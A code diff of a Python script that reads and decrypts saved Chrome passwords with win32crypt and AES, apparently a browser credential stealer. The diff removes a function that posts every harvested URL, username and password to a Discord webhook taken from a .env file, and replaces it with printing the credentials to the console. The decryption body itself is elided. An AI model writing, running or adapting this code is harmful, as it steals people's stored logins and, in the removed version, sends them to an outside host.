@@ -1,12 +1,10 @@
 import os
+import shutil
+import sqlite3
 import json
 import base64
-import sqlite3
-import shutil
-import requests
 from Crypto.Cipher import AES
 import win32crypt
-from dotenv import load_dotenv
 
 
 def get_chrome_pass():
@@ -60,37 +58,13 @@ def get_chrome_pass():
     return passwords
 
 
-def send_to_discord_webhook(webhook_url, passwords):
-    headers = {
-        'Content-Type': 'application/json'
-    }
-    content = "Passwords:\n"
-    for entry in passwords:
-        content += f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n\n"
-
-    data = {
-        'content': content
-    }
-
-    response = requests.post(webhook_url, headers=headers, json=data)
-    if response.status_code == 204:
-        print("Successfully sent to Discord webhook.")
-    else:
-        print(f"Failed to send to Discord webhook. Status code: {response.status_code}")
-
-
-def load_config():
-    load_dotenv()  # Load environment variables from .env file
-    return os.getenv('DISCORD_WEBHOOK_URL')
-
-
 if __name__ == "__main__":
     try:
         passwords = get_chrome_pass()
-        webhook_url = load_config()
-        if webhook_url:
-            send_to_discord_webhook(webhook_url, passwords)
-        else:
-            print("Webhook URL not found in .env file.")
+        for entry in passwords:
+            print(f"URL: {entry['url']}")
+            print(f"Username: {entry['username']}")
+            print(f"Password: {entry['password']}")
+            print()
     except Exception as e:
         print(f"Error: {e}")
